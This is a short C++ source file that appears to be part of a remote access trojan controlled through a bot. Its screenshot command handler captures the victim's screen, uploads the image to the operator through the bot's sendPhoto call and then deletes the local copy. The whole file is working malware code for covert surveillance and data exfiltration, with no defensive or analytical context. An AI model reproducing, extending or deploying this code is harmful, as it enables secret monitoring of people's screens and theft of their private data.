#include "rat/system.hpp"
#include "rat/tbot/handler/handleUpdate.hpp"
#include "rat/media.hpp"
#include <filesystem>
#include <fmt/core.h>

#include "logging.hpp"
namespace rat::tbot::handler {

std::string _handleScreenshotCommand(const Bot& arg_Bot) {
    
    auto image_path = std::filesystem::path(fmt::format("{}.jpg", rat::system::getCurrentDateTime_Underscored() ));
    std::string output_buffer;
    bool success = rat::media::screenshot::takeScreenshot(image_path, output_buffer);
    if(success && std::filesystem::exists(image_path)) {
        DEBUG_LOG("{} taken", image_path.string());
        if(arg_Bot.sendPhoto(image_path) != rat::tbot::BotResponse::SUCCESS) {
            ERROR_LOG("Failed at uploading {}", image_path.string());
        }
        
        rat::system::removeFile(image_path);
    }
    return output_buffer;
}


}
